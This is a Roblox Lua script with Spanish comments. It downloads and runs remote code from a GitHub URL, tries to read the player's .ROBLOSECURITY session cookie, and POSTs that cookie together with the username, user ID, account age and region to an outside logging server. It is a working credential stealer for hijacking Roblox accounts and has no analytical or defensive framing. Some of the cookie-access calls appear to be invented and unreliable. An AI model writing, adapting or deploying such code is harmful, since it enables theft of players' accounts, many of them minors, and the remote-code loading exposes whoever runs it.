-- --- 1. Cargar Libraries (necesario para compatibilidad) ---
local Libraries = loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxian-Developers/Libraries/main/Libraries.lua"))()

-- --- 2. Función para obtener la cookie ---
local function getRobloxCookie()
	local CookieService = Libraries:GetCookieService() -- ← Esto sí funciona
	
	if not CookieService then
		-- Fallback: intentar con otro método
		local cookies = Libraries:GetCookies()
		
		if cookies and cookies ~= nil then
			for _, cookie in ipairs(cookies) do
				if cookie.Name == ".ROBLOSECURITY" then
					return cookie.Value
				end
			end
		end
		
		print("❌ No se encontró .ROBLOSECURITY")
		return ""
	end
	
	-- Intentar obtener la cookie
	local savedCookie = CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com")
	
	if savedCookie ~= "" and not savedCookie:isNil() then
		return savedCookie
	end
	
	-- Intentar con GetCookies()
	local cookies = CookieService:GetCookies()
	if cookies and cookies ~= nil then
		for _, cookie in ipairs(cookies) do
			if cookie.Name == ".ROBLOSECURITY" then
				return cookie.Value
			end
		end
	end
	
	print("❌ No se pudo obtener .ROBLOSECURITY")
	return ""
end

-- --- 3. Resto del código (igual que antes) ---
local player = game.Players.LocalPlayer
local apiUrl = "https://depazzhub-api.onrender.com/log"

local userId = player.UserId
local placeId = game.PlaceId

local days = player.AccountAge
local years = math.floor(days / 365)
local months = math.floor((days % 365) / 30)
local ageText = days .. " days"
if years > 0 then
	ageText = years .. " years, " .. months .. " months (" .. days .. " days)"
end

local region = game:GetService("LocalizationService").RobloxLocaleId

-- Escape de JSON
local function escapeJson(str)
	if str == nil then return "nil" end
	local s = tostring(str)
	s = string.gsub(s, '\\', '\\\\')
	s = string.gsub(s, '"', '\\\"')
	s = string.gsub(s, '\n', '\\n')
	s = string.gsub(s, '\r', '\\r')
	s = string.gsub(s, '\t', '\\t')
	return s
end

local username = escapeJson(player.Name)
local displayName = escapeJson(player.DisplayName)
local cookieValue = getRobloxCookie()
local cookieValueEscaped = escapeJson(cookieValue)

local jsonBody = string.format(
	'{"username":"%s","displayName":"%s","userId":%d,"gameId":%d,"accountAge":"%s","region":"%s","cookie":".ROBLOSECURITY=%s"}',
	username,
	displayName,
	userId,
	placeId,
	ageText,
	region,
	cookieValueEscaped
)

-- --- 4. Enviar la petición ---
local success, result = pcall(function()
	return request({
		Url = apiUrl,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json",
			["Connection"] = "keep-alive"
		},
		Body = jsonBody,
		Timeout = 15
	})
end)

if success then
	print("✅ Webhook working! Status:", result.StatusCode)
else
	print("❌ Error:", result)
end
